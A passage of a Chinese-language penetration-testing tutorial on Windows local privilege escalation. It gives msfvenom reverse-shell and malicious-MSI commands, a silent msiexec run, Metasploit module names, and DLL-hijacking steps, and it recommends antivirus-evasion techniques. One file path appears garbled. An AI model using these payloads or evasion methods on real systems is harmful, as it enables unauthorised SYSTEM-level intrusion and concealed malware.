### 优化后的文本

#### 一、服务管理器通信与用户添加
用户“user”无法与服务管理器进行通信，但请放心，我们的命令已经以SYSTEM权限成功运行，并且已成功添加了一个新用户。接下来，我们将通过相同的方法将该用户添加到本地管理员组中（需要再次停止服务，但由于之前发生的错误，进程已被终止，服务当前并未运行）。

现在，您可以使用新创建的本地管理员帐户了！此外，您还可以将一个反弹shell载荷上传至目标机器，并修改binpath的值为载荷路径。不过，这次无需手动操作，可以使用现成的Metasploit模块：[exploit/windows/local/service_permissions](https://www.rapid7.com/db/modules/exploit/windows/local/service_permissions)。只需将此模块与现有的低权限Meterpreter会话关联即可。

#### 二、不安全的文件/文件夹权限
类似于前面提到的“服务路径未加双引号”的情况，这种方法利用了“CreateProcess”函数的弱点，结合了文件夹权限和服务可执行文件路径。然而，在这一部分中，我们将尝试直接替换可执行文件本身。

例如，如果检查测试环境中“Vulnerable Service”服务的可执行文件路径权限，我们会发现它没有得到充分保护。我们只需将“Executable.exe”文件替换为反弹shell载荷，当服务重启时，就会返回一个具有SYSTEM权限的Meterpreter会话。

#### 三、AlwaysInstallElevated设置
AlwaysInstallElevated是一种策略设置，允许非特权用户在系统中安装任何程序时以SYSTEM权限运行MSI文件。启用此设置后，所有程序都将获得扩展权限，相当于赋予非特权用户管理员权限。尽管如此，有时系统管理员仍会选择启用此设置。

要检查该策略是否被启用，请查看以下注册表键值：
- `HKEY_LOCAL_MACHINE\Software\Policies\Microsoft\Windows\Installer\AlwaysInstallElevated`
- `HKEY_CURRENT_USER\Software\Policies\Microsoft\Windows\Installer\AlwaysInstallElevated`

如果您拥有一个低权限的Meterpreter会话，可以使用`reg`内建命令来检查这些值。如果收到类似“ERROR: The system was unable to find the specified registry key or value.”的消息，则表示该策略未启用。若输出结果表明策略已启用，您可以生成恶意的`.msi`文件并运行它。Msfvenom工具可以帮助完成这项工作。

例如，要生成一个反弹shell载荷(Payload.exe)，并使用一个MSI文件执行该载荷，首先生成Payload.exe：
```bash
msfvenom -p windows/meterpreter/reverse_tcp LHOST=<your_ip> LPORT=<your_port> -f exe -o Payload.exe
```
然后，使用`windows/exec`生成恶意MSI文件，并确保填写正确的Payload.exe路径：
```bash
msfvenom -p windows/exec CMD="C:\Path\To\Payload.exe" -f msi -o malicious.msi
```
将这两个文件上传到目标机器上，然后在另一个窗口中开启一个新的监听器，等待高权限的Shell连接。最后，执行`.msi`文件：
```bash
msiexec /quiet /qn /i C:\Path\To\malicious.msi
```
除了手动操作，您也可以使用现成的Metasploit模块：[exploit/windows/local/always_install_elevated](https://www.rapid7.com/db/modules/exploit/windows/local/always_install_elevated)。只需将SESSION参数设置为现有Meterpreter会话即可。

#### 四、DLL劫持
如果上述方法均未成功，不要放弃。我们可以研究正在运行的进程。即使我们的Shell是以低权限运行的，我们仍可以了解哪些进程在高权限下运行。如果其中一个进程存在漏洞，我们就可以利用它提升权限。

假设我们注意到Vulnerable.exe进程，它试图加载名为“hijackable.dll”的DLL。在这种情况下，Vulnerable.exe存在DLL劫持漏洞。微软对此有详细解释：当应用程序动态加载DLL而不指定完整路径时，Windows会按照特定目录顺序搜索DLL。如果攻击者控制了其中一个目录，可以用恶意DLL替换合法DLL，从而实现本地权限提升。

为了利用这个漏洞，我们需要：
1. 检查进程加载的DLL是否存在于磁盘中。
2. 如果不存在，将恶意DLL放在上述目录之一中。
3. 如果存在，将恶意DLL放在优先级更高的目录中。

例如，如果目标机器上安装了Python，且认证用户对该目录有写权限，我们可以将恶意DLL上传到该目录。重启Vulnerable.exe进程后，它会加载恶意DLL，从而执行我们的代码。

#### 五、存储的凭证
如果上述方法中的任何一种成功提升了权限，接下来可以尝试查找存储的凭证。常见的检查目录包括：
- `C:\unattend.xml`
- `C:\sysprep.inf`
- `C:\sysprepsysprep.xml`

您可以使用以下查询方法进行检查：
```powershell
Get-ChildItem -Path C:\ -Recurse -Filter *.xml
```

#### 六、内核漏洞
本文主要讨论了不依赖内核漏洞的提权方法。如果您希望利用内核漏洞提升权限，可以使用以下命令列出机器中的更新：
```powershell
wmic qfe list
```

#### 七、对有效载荷的说明
在本文中，我们使用了由msfvenom生成的载荷。然而，由于这些载荷已被广泛标记为恶意软件，建议在创建可执行文件时采用绕过反病毒检测的技术。您可以参考以下文章：
- [Art of Anti Detection 1 – Introduction to AV & Detection Techniques](https://pentest.blog/art-of-anti-detection-1-introduction-to-av-detection-techniques/)
- [Art of Anti Detection 2 – PE Backdoor Manufacturing](https://pentest.blog/art-of-anti-detection-2-pe-backdoor-manufacturing/)
- [反侦测的艺术part1：介绍AV和检测的技术](http://bobao.360.cn/learning/detail/3420.html)
- [反侦测的艺术part2：精心打造PE后门](http://bobao.360.cn/learning/detail/3407.html)

希望这些优化后的文本能帮助您更好地理解和应用相关技术。